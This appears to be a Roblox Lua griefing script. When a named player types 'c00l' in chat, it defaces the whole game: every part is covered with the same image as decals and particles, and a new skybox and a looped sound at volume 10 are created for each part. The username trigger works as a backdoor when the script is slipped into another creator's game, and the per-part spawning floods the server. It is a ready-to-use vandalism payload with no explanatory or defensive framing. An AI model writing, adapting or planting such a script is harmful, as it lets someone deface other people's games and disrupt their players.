local Owner = "PutHereRobloxUserName" -- Put Roblox User Name
game.Players[Owner].Chatted:Connect(function(msg7)
	if msg7 == "c00l" then
		for i,v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") or v:IsA("WedgePart") then
				local sky = Instance.new("Sky",game.Lighting)            
				sky.SkyboxBk = "http://www.roblox.com/asset/?id=433381097"
				sky.SkyboxDn = "http://www.roblox.com/asset/?id=433381097"
				sky.SkyboxFt = "http://www.roblox.com/asset/?id=433381097"
				sky.SkyboxLf = "http://www.roblox.com/asset/?id=433381097"
				sky.SkyboxRt = "http://www.roblox.com/asset/?id=433381097"
				sky.SkyboxUp = "http://www.roblox.com/asset/?id=433381097"

				local Sound = Instance.new("Sound",game.Workspace)
				Sound.SoundId = "rbxassetid://8552629074"
				Sound.Looped = true
				Sound.Volume = 10
				Sound:Play()
				local cool = Instance.new("ParticleEmitter",v)
				cool.Texture = "http://www.roblox.com/asset/?id=433381097"

				local poop2 = Instance.new("Decal",v)
				poop2.Texture = "http://www.roblox.com/asset/?id=433381097"
				poop2.Face = "Back"

				local poop3 = Instance.new("Decal",v)
				poop3.Texture = "http://www.roblox.com/asset/?id=433381097"
				poop3.Face = "Bottom"

				local poop4 = Instance.new("Decal",v)
				poop4.Texture = "http://www.roblox.com/asset/?id=433381097"
				poop4.Face = "Left"

				local poop5 = Instance.new("Decal",v)
				poop5.Texture = "http://www.roblox.com/asset/?id=433381097"
				poop5.Face = "Top"

				local poop6 = Instance.new("Decal",v)
				poop6.Texture = "http://www.roblox.com/asset/?id=433381097"
				poop6.Face = "Right"

				local poop7 = Instance.new("Decal",v)
				poop7.Texture = "http://www.roblox.com/asset/?id=433381097"
				poop7.Face = "Front"
			end
		end
	end
end)
